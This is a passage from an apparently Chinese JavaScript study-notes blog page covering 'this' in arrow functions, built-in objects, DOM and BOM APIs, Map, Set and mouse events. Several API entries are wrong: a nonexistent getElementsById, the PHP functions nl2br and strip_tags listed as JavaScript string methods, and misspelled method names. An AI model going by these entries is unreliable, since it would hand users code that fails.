class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;原生函数this：&quot;</span>,<span class="variable language_">this</span>.<span class="property">str</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">arrowFn : <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;当前作用于this：&quot;</span>,<span class="variable language_">this</span>.<span class="property">str</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;箭头函数this：&quot;</span>,<span class="variable language_">this</span>.<span class="property">str</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj_2 = &#123;</span><br><span class="line"><span class="attr">str</span>:<span class="string">&quot;obj_2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> nativeFn = obj_1.<span class="title function_">nativeFn</span>();</span><br><span class="line"><span class="keyword">var</span> arrowFn = obj_1.<span class="title function_">arrowFn</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">nativeFn</span>();</span><br><span class="line"><span class="title function_">arrowFn</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;下面改变调用者&quot;</span>);</span><br><span class="line">nativeFn.<span class="title function_">call</span>(obj_2);</span><br><span class="line">arrowFn.<span class="title function_">call</span>(obj_2);</span><br></pre></td></tr></table></figure><hr><h2 id="五、对象"><a href="#五、对象" class="headerlink" title="五、对象"></a>五、对象</h2><blockquote><p>自定义对象前的对象为内置对象。</p></blockquote><h3 id="1-with"><a href="#1-with" class="headerlink" title="1 with"></a>1 with</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// with语句中的变量都会默认指向with后面所包含的对象。</span></span><br><span class="line">&lt;form name=<span class="string">&quot;myform&quot;</span>&gt;&lt;/form&gt;</span><br><span class="line"><span class="title function_">with</span>(<span class="params"><span class="variable language_">document</span>.myform</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> username = username.<span class="property">value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-String"><a href="#2-String" class="headerlink" title="2 String"></a>2 String</h3><blockquote><p>字符串对象</p></blockquote><ul><li><p>属性</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回字符串的长度</span></span><br><span class="line">str.<span class="property">length</span></span><br></pre></td></tr></table></figure></li><li><p>方法</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回指定位置处的字符，也可以直接用索引获得。</span></span><br><span class="line">str.<span class="title function_">charAt</span>(idx);</span><br><span class="line"><span class="comment">// 返回指定子字符串的位置，从左到右。找不到返回-1(起始位置)。</span></span><br><span class="line">str.<span class="title function_">indexOf</span>(chr,start);</span><br><span class="line"><span class="comment">// 反向检索</span></span><br><span class="line"><span class="title function_">lastIndexOf</span>(chr,start);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在字符串中用一些字符替换另一些字符</span></span><br><span class="line"><span class="title function_">replace</span>(regexp/substr,replacement);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把一个字符串分割成字符串数组（同py）</span></span><br><span class="line"><span class="title function_">split</span>(separator,limit);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回给定字符串中从m位置开始，取n个字符，如果参数n省略，则意味着取到字符串末尾。</span></span><br><span class="line">str.<span class="title function_">substr</span>(m,n);</span><br><span class="line"><span class="comment">// 返回给定字符串中从m位置开始，到n位置结束，如果参数n省略，则意味着取到字符串末尾。</span></span><br><span class="line">str.<span class="title function_">substring</span>(m, n);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将字符串中的字符全部转化成小写。</span></span><br><span class="line">str.<span class="title function_">toLowerCase</span>();</span><br><span class="line"><span class="comment">// 将字符串中的字符全部转化成大写。</span></span><br><span class="line">str.<span class="title function_">toUpperCase</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// /n转&lt;br /&gt;</span></span><br><span class="line"><span class="title function_">nl2br</span>(string);</span><br><span class="line"><span class="comment">// 除去字符串中的HTML、XML、PHP标记</span></span><br><span class="line"><span class="title function_">strip_tags</span>(string,[allow]);</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-Math"><a href="#3-Math" class="headerlink" title="3 Math"></a>3 Math</h3><blockquote><p>数学对象</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 随机数，0-1</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">random</span>();</span><br><span class="line"><span class="comment">// 向上取整</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">ceil</span>(value);</span><br><span class="line"><span class="comment">// 向下取整</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">floor</span>(value);</span><br><span class="line"><span class="comment">// 四舍五入</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">round</span>(value);</span><br><span class="line"><span class="comment">// 最大最小</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">max</span>(value_1,value_2);</span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">min</span>(value_1,value_2);</span><br><span class="line"><span class="comment">// 绝对值</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">abs</span>(value);</span><br><span class="line"><span class="comment">// 次方</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">pow</span>(value,n);</span><br><span class="line"><span class="comment">// 开方</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">sqrt</span>(value);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// π</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="property">PI</span>;</span><br><span class="line"><span class="comment">// 正弦和反正弦（其他三角函数同理）</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">sin</span>(value);</span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">asin</span>(value);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-Date"><a href="#4-Date" class="headerlink" title="4 Date"></a>4 Date</h3><blockquote><p>日期对象</p><p>转换成本地时间字符串说明：</p><ol><li>getMonth()：得到值：0~11 (1月~12月)</li><li>setMonth()：设置值：0~11</li><li>toLocaleString()：可根据本地时间把 Date 对象转换为字符串，并返回结果。</li></ol><p><a href="https://blog.csdn.net/kelly0721/article/details/112005664">toLocaleString()</a></p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// B端时间。</span></span><br><span class="line"><span class="comment">// 通过new方法创建日期对象</span></span><br><span class="line"><span class="keyword">var</span> mydate=<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="comment">// 获取日期（年月日时分秒）</span></span><br><span class="line"><span class="title function_">getFullYear</span>();</span><br><span class="line"><span class="title function_">getMonth</span>();</span><br><span class="line"><span class="title function_">getDate</span>();</span><br><span class="line"><span class="title function_">getHours</span>();</span><br><span class="line"><span class="title function_">getMinutes</span>();</span><br><span class="line"><span class="title function_">getseconds</span>();</span><br><span class="line"><span class="comment">// 设置日期</span></span><br><span class="line"><span class="title function_">setYear</span>();</span><br><span class="line"><span class="title function_">setMonth</span>();</span><br><span class="line"><span class="title function_">setDate</span>();</span><br><span class="line"><span class="title function_">setHours</span>();</span><br><span class="line"><span class="title function_">setMinutes</span>();</span><br><span class="line"><span class="title function_">setSeconds</span>();</span><br><span class="line"><span class="comment">// 数字转换为本地格式表示的字符串</span></span><br><span class="line"><span class="title function_">toLoacaleString</span>();</span><br></pre></td></tr></table></figure><h3 id="5-Array"><a href="#5-Array" class="headerlink" title="5 Array"></a>5 Array</h3><blockquote><p>数组对象</p><p><a href="https://blog.csdn.net/m0_37885651/article/details/80016718">sortby</a></p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 添加元素到最后</span></span><br><span class="line">arr.<span class="title function_">push</span>(value);</span><br><span class="line"><span class="comment">// 添加元素到最前</span></span><br><span class="line">arr.<span class="title function_">unshift</span>(value);</span><br><span class="line"><span class="comment">// 删除最后一项</span></span><br><span class="line">arr.<span class="title function_">pop</span>();</span><br><span class="line"><span class="comment">// 删除第一项</span></span><br><span class="line">arr.<span class="title function_">shift</span>();</span><br><span class="line"><span class="comment">// 删除元素</span></span><br><span class="line"><span class="keyword">delete</span> arr[index];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组排序</span></span><br><span class="line">arr.<span class="title function_">sort</span>(sortby);</span><br><span class="line"><span class="comment">// sortby（升序，b-a是降序，原理同C）</span></span><br><span class="line"><span class="keyword">function</span>(<span class="params">a,b</span>)&#123;<span class="keyword">return</span> a-b&#125;;</span><br><span class="line"><span class="comment">// 数组翻转</span></span><br><span class="line">arr.<span class="title function_">reverse</span>();</span><br><span class="line"><span class="comment">// 数组转成字符串，以value分割</span></span><br><span class="line">arr.<span class="title function_">join</span>([value]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组元素索引</span></span><br><span class="line">arr.<span class="title function_">indexOf</span>(value);</span><br><span class="line"><span class="comment">// 截取(切片)数组，原数组不发生变化，[ start , end )</span></span><br><span class="line">arr.<span class="title function_">slice</span>(start,end);</span><br><span class="line"><span class="comment">// 剪接数组，原数组变化，从start开始切num出来，再新增元素add_1等</span></span><br><span class="line">arr.<span class="title function_">splice</span>(start,num,[add_1 , add_2 , ...]);</span><br><span class="line"><span class="comment">// 数组合并</span></span><br><span class="line">arr.<span class="title function_">concat</span>(new_arr);</span><br></pre></td></tr></table></figure><h3 id="6-Arguments"><a href="#6-Arguments" class="headerlink" title="6 Arguments"></a>6 Arguments</h3><blockquote><p>只在函数内定义，保存了函数的实参。</p></blockquote><h3 id="7-document"><a href="#7-document" class="headerlink" title="7 document"></a>7 document</h3><blockquote><p>通过javascript来操作DOM元素</p></blockquote><ul><li><p>获取DOM属性</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 从上到下依ID获得DOM（加s获得数组）</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(id);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsById</span>(id);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Name获得，edge 12以上支持</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 依html获得，只有这个函数可以操作动态的dom</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(tag);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类名获得，ie9以上支持</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="keyword">class</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// CSS选择器获得，ie8部分支持，ie9及以上支持。</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(选择器);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(选择器);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取对象值</span></span><br><span class="line">dom.<span class="property">innerHTML</span>;</span><br><span class="line">dom.<span class="property">innerText</span>;</span><br></pre></td></tr></table></figure></li><li><p>操作DOM属性</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对象属性</span></span><br><span class="line"><span class="comment">// 此种方法无法获取自定义属性</span></span><br><span class="line">dom.<span class="property">html_attr</span>=<span class="string">&#x27;值&#x27;</span>;</span><br><span class="line"><span class="comment">// 这种方法可以改变元素的css类，从而调整外观</span></span><br><span class="line">dom.<span class="property">class_Name</span>=<span class="string">&#x27;类名&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象方法</span></span><br><span class="line"><span class="comment">// 获取指定dom元素的attr属性，可以获取自定义属性</span></span><br><span class="line">dom.<span class="title function_">getAttribute</span>(<span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line"><span class="comment">// 设置指定dom元素attr属性的值</span></span><br><span class="line">dom.<span class="title function_">setAttribute</span>(<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;值&#x27;</span>)</span><br><span class="line"><span class="comment">// 删除指定dom元素的attr属性</span></span><br><span class="line">dom.<span class="title function_">removeAttribute</span>(<span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line"><span class="comment">// 判断指定dom元素是否含有attr属性</span></span><br><span class="line">dom.<span class="title function_">hasAttribute</span>(<span class="string">&#x27;attr&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>操作CSS属性</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取CSS属性值</span></span><br><span class="line"><span class="comment">// 注意css属性的驼峰写法，background-color应写成backgroundColor</span></span><br><span class="line"><span class="comment">// obj.style.attr的方式只能获取css行内属性，而不能获取其他方式的css属性，所以应该用getComputedStyle方法来获取完整的css属性</span></span><br><span class="line"><span class="title function_">getComputedStyle</span>(dom).<span class="property">property</span>;</span><br><span class="line"><span class="title function_">getComputedStyle</span>(dom)[<span class="string">&#x27;property&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置CSS属性值</span></span><br><span class="line"><span class="comment">// 此方法只能设置行内样式，一次只能设置一个css属性</span></span><br><span class="line">dom.<span class="property">style</span>.<span class="property">property</span>=<span class="string">&#x27;new style&#x27;</span>;</span><br><span class="line"><span class="comment">// 一次可以设置多个属性。实际应用中更倾向与使用dom元素.className=&#x27;类名&#x27;，这个方法来改变元素的多个属性</span></span><br><span class="line">dom.<span class="property">style</span>.<span class="property">cssText</span>=<span class="string">&quot;style&quot;</span>;</span><br></pre></td></tr></table></figure></li><li><p>DOM遍历</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父节点</span></span><br><span class="line">dom.<span class="property">parentNode</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子节点</span></span><br><span class="line"><span class="comment">// 获取所有子节点，包括元素节点和文本节点</span></span><br><span class="line">dom.<span class="property">childNodes</span>;</span><br><span class="line"><span class="comment">// 获取所有元素节点，不包括文本节点</span></span><br><span class="line">dom.<span class="property">children</span>;</span><br><span class="line"><span class="comment">// 第一个子节点，包括元素节点和文本节点</span></span><br><span class="line">dom.<span class="property">firstChild</span>;</span><br><span class="line"><span class="comment">// 第一个元素节点</span></span><br><span class="line">dom.<span class="property">firstElementChild</span>;</span><br><span class="line"><span class="comment">// 最后一个子节点，包括元素节点和文本节点</span></span><br><span class="line">dom.<span class="property">lastChild</span>;</span><br><span class="line"><span class="comment">// 最后一个元素节点</span></span><br><span class="line">dom.<span class="property">lastElementChild</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：使用childNodes、firstChild、lastChild来操作元素节点非常麻烦，因为它们把文本节点（一般是空白节点）包括进来了，Javascript为了让我们可以快速开发，提供了新的方法，也就是只针对元素节点的操作属性，children、firstElementChild、lastElementChild。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 兄弟节点</span></span><br><span class="line"><span class="comment">// 前后一个兄弟节点，包括文本节点和元素节点。</span></span><br><span class="line">dom.<span class="property">previousSibling</span>;</span><br><span class="line">dom.<span class="property">nextSibling</span>;</span><br><span class="line"><span class="comment">// 前后一个元素节点</span></span><br><span class="line">dom.<span class="property">previousElementSibling</span>;</span><br><span class="line">dom.<span class="property">nextElementSibling</span>;</span><br></pre></td></tr></table></figure></li><li><p>动态DOM</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 要创建一个元素需要以下四步</span></span><br><span class="line"><span class="comment">// 1.创建元素节点</span></span><br><span class="line"><span class="title function_">createElement</span>(<span class="string">&#x27;html_label&#x27;</span>);</span><br><span class="line"><span class="comment">// 2.创建文本节点</span></span><br><span class="line"><span class="title function_">createTextNode</span>(<span class="string">&#x27;text_content&#x27;</span>);</span><br><span class="line"><span class="comment">// 3.把文本节点插入元素节点</span></span><br><span class="line">parent.<span class="title function_">appendChild</span>(B);</span><br><span class="line">parent.<span class="title function_">appendChild</span>(B,ref); <span class="comment">//插在ref前</span></span><br><span class="line"><span class="comment">// 4.把组装好的元素插入到已有元素中</span></span><br><span class="line"><span class="title function_">appendChild</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除</span></span><br><span class="line">dom.<span class="title function_">removeChild</span>(B);</span><br><span class="line"><span class="comment">// 克隆</span></span><br><span class="line">dom.<span class="title function_">cloneNode</span>(bool);</span><br><span class="line"><span class="comment">// 替换</span></span><br><span class="line">dom.<span class="title function_">replaceChild</span>(<span class="keyword">new</span>,old);</span><br></pre></td></tr></table></figure></li></ul><h3 id="8-自定义对象"><a href="#8-自定义对象" class="headerlink" title="8 自定义对象"></a>8 自定义对象</h3><blockquote><p>this：</p><ul><li>函数中使用：调用windows对象，相当于定义在全局对象上的属性。</li><li>对象中使用：调用本对象的属性。</li></ul></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建对象</span></span><br><span class="line"><span class="comment">// 直接赋值创建对象</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;; <span class="comment">//空对象</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">key</span>: value, <span class="attr">key</span>: value, ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过 new Object对象创建：</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="title class_">Object</span>(); <span class="comment">//空对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过 Object 对象的 create 方法创建</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>); <span class="comment">// 空对象</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="title class_">Object</span>.<span class="title function_">create</span>(other_obj); <span class="comment">// 继承别的对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 值操作</span></span><br><span class="line"><span class="comment">// 直接赋值（属性在对象中可以不存在）</span></span><br><span class="line">obj.<span class="property">key</span> = value;</span><br><span class="line"><span class="comment">// 引用对象中的值</span></span><br><span class="line">obj[key];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注：值不一样（中括号是引用了Symbol而点是创建了新值）</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PROP_NAME</span> = <span class="title class_">Symbol</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PROP_AGE</span> = <span class="title class_">Symbol</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line"><span class="attr">PROP_NAME</span>:<span class="string">&quot;一斤鸭梨&quot;</span>,</span><br><span class="line"><span class="attr">PROP_AGE</span>:<span class="number">12</span>,</span><br><span class="line">[<span class="variable constant_">PROP_NAME</span>]:<span class="string">&quot;两斤鸭梨&quot;</span>,</span><br><span class="line">[<span class="variable constant_">PROP_AGE</span>]:<span class="number">13</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">PROP_NAME</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">PROP_AGE</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj[<span class="variable constant_">PROP_NAME</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj[<span class="variable constant_">PROP_AGE</span>]);</span><br></pre></td></tr></table></figure><h3 id="9-序列化与反序列化"><a href="#9-序列化与反序列化" class="headerlink" title="9 序列化与反序列化"></a>9 序列化与反序列化</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 序列化对象，将对象转化为字符串</span></span><br><span class="line"><span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj);</span><br><span class="line"><span class="comment">// 反序列化，将Json字符串转化为对象</span></span><br><span class="line"><span class="title class_">JSON</span>.<span class="title function_">parse</span>(jsonStr);</span><br></pre></td></tr></table></figure><h3 id="10-Map"><a href="#10-Map" class="headerlink" title="10 Map"></a>10 Map</h3><blockquote><p>字典</p><p>Map和Object的区别：</p><ul><li>一个Object的键只能是字符串或者Symbols，但一个Map 的键可以是任意值。</li><li>Map中的键值是有序的（FIFO 原则），而添加到对象中的键则不是。</li><li>Map的键值对个数可以从size属性获取，而Object的键值对个数只能手动计算。</li></ul></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 新建Map</span></span><br><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 赋值</span></span><br><span class="line">map.<span class="title function_">set</span>(<span class="string">&quot;str&quot;</span>,<span class="string">&quot;The type of key is string&quot;</span>);</span><br><span class="line">map.<span class="title function_">set</span>(obj,<span class="string">&quot;The type of key is obj&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="11-Set"><a href="#11-Set" class="headerlink" title="11 Set"></a>11 Set</h3><blockquote><p>集合</p><p>Set对象存储的值总是唯一的，所以需要判断两个值是否恒等。有几个特殊值需要特殊对待：</p><ul><li>+0与-0在存储判断唯一性的时候是恒等的，所以不能重复</li><li>undefined与undefined是恒等的，所以不能重复</li><li>NaN与NaN是不恒等的，但是在Set中只能存一个，不能重复</li></ul></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 新建Set</span></span><br><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 赋值</span></span><br><span class="line">set.<span class="title function_">add</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Array转Set</span></span><br><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="string">&quot;value1&quot;</span>,<span class="string">&quot;value2&quot;</span>]);</span><br><span class="line"><span class="comment">// Set转Array</span></span><br><span class="line"><span class="keyword">let</span> array = [...set];</span><br><span class="line"></span><br><span class="line"><span class="comment">// String转Set（set = Set(4) &#123;&#x27;H&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;o&#x27;&#125;）</span></span><br><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="title class_">Set</span>(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组去重</span></span><br><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>]);</span><br><span class="line"><span class="keyword">let</span> array = [...set];</span><br><span class="line"><span class="comment">// 并集</span></span><br><span class="line"><span class="keyword">let</span> union = <span class="keyword">new</span> <span class="title class_">Set</span>([...set1, ...set2]);</span><br><span class="line"><span class="comment">// 交集</span></span><br><span class="line"><span class="keyword">let</span> intersect = <span class="keyword">new</span> <span class="title class_">Set</span>([...set1].<span class="title function_">filter</span>(<span class="function"><span class="params">x</span> =&gt;</span> set2.<span class="title function_">has</span>(x)));</span><br><span class="line"><span class="comment">// 差集</span></span><br><span class="line"><span class="keyword">let</span> difference = <span class="keyword">new</span> <span class="title class_">Set</span>([...set1].<span class="title function_">filter</span>(<span class="function"><span class="params">x</span> =&gt;</span> !set2.<span class="title function_">has</span>(x)));</span><br></pre></td></tr></table></figure><hr><h2 id="六、BOM"><a href="#六、BOM" class="headerlink" title="六、BOM"></a>六、BOM</h2><blockquote><p>浏览器对象模型。</p></blockquote><h3 id="1-window"><a href="#1-window" class="headerlink" title="1 window"></a>1 window</h3><ul><li><p>属性</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 表示浏览器窗口的内部大小（包括滚动条）</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">innerHeight</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">innerWidth</span></span><br></pre></td></tr></table></figure></li><li><p>方法</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 打开新窗口</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(url)</span><br><span class="line"><span class="comment">// 关闭当前窗口</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">close</span>() </span><br><span class="line"></span><br><span class="line"><span class="comment">//滚动x,y </span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">scrollBy</span>( x , y )</span><br><span class="line"><span class="comment">//滚动到x,y处</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">scrollTo</span>( x , y )</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//向下滚动一页面高度</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">scrollTo</span>(<span class="number">0</span>,<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollHeight</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-screen"><a href="#2-screen" class="headerlink" title="2 screen"></a>2 screen</h3><blockquote><p>浏览器窗口。</p></blockquote><ul><li><p>属性</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 可用的屏幕宽度</span></span><br><span class="line">screen.<span class="property">availWidth</span></span><br><span class="line"><span class="comment">// 可用的屏幕高度（可用高度，减去任务栏）</span></span><br><span class="line">screen.<span class="property">availHeight</span></span><br></pre></td></tr></table></figure></li><li><p>方法</p></li></ul><h3 id="3-location"><a href="#3-location" class="headerlink" title="3 location"></a>3 location</h3><blockquote><p>地址栏对象。</p></blockquote><ul><li><p>属性</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当前页面的url</span></span><br><span class="line">location.<span class="property">href</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="4-history"><a href="#4-history" class="headerlink" title="4 history"></a>4 history</h3><blockquote><p>浏览器历史对象。</p></blockquote><ul><li><p>属性</p></li><li><p>方法</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 与在浏览器中点击向前按钮相同</span></span><br><span class="line">history.<span class="title function_">forward</span>()</span><br><span class="line"><span class="comment">// 与在浏览器点击后退按钮相同</span></span><br><span class="line">history.<span class="title function_">back</span>()</span><br><span class="line"><span class="comment">// 跳到浏览历史的第n项</span></span><br><span class="line">history.<span class="title function_">go</span>(n)</span><br><span class="line">history.<span class="title function_">go</span>(-<span class="number">1</span>); <span class="comment">// 回到上一页面</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="5-navigator"><a href="#5-navigator" class="headerlink" title="5 navigator"></a>5 navigator</h3><blockquote><p>获得浏览器的信息。</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    txt = <span class="string">&quot;&lt;p&gt;浏览器代号: &quot;</span> + navigator.<span class="property">appCodeName</span> + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    txt+= <span class="string">&quot;&lt;p&gt;浏览器名称: &quot;</span> + navigator.<span class="property">appName</span> + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    txt+= <span class="string">&quot;&lt;p&gt;浏览器版本: &quot;</span> + navigator.<span class="property">appVersion</span> + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    txt+= <span class="string">&quot;&lt;p&gt;启用Cookies: &quot;</span> + navigator.<span class="property">cookieEnabled</span> + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    txt+= <span class="string">&quot;&lt;p&gt;硬件平台: &quot;</span> + navigator.<span class="property">platform</span> + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    txt+= <span class="string">&quot;&lt;p&gt;用户代理: &quot;</span> + navigator.<span class="property">userAgent</span> + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    txt+= <span class="string">&quot;&lt;p&gt;用户代理语言: &quot;</span> + navigator.<span class="property">language</span> + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(txt);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="七、事件"><a href="#七、事件" class="headerlink" title="七、事件"></a>七、事件</h2><h3 id="1-鼠标点击事件"><a href="#1-鼠标点击事件" class="headerlink" title="1 鼠标点击事件"></a>1 鼠标点击事件</h3><div class="table-container"><table><thead><tr><th>事件名</th><th>描述</th></tr></thead><tbody><tr><td>onclick</td><td>单机鼠标左键时触发</td></tr><tr><td>ondbclick</td><td>双击鼠标左键时触发</td></tr><tr><td>onmousedown</td><td>鼠标任意键按下时触发</td></tr><tr><td>onmouseup</td><td>松开鼠标任意按键时触发</td></tr><tr><td>onmouseover</td><td>鼠标指针移动到元素上时触发</td></tr><tr><td>onmouseout</td><td>鼠标指针移出元素边界时触发</td></tr><tr><td>onmousemove</td><td>鼠标指针在元素上移动时持续触发</td></tr></tbody></table></div><h3 id="2-html事件"><a href="#2-html事件" class="headerlink" title="2 html事件"></a>2 html事件</h3><div class="table-container"><table><thead><tr><th>事件名</th><th>描述</th></tr></thead><tbody><tr><td>onload</td><td>页面完全加载后再 window 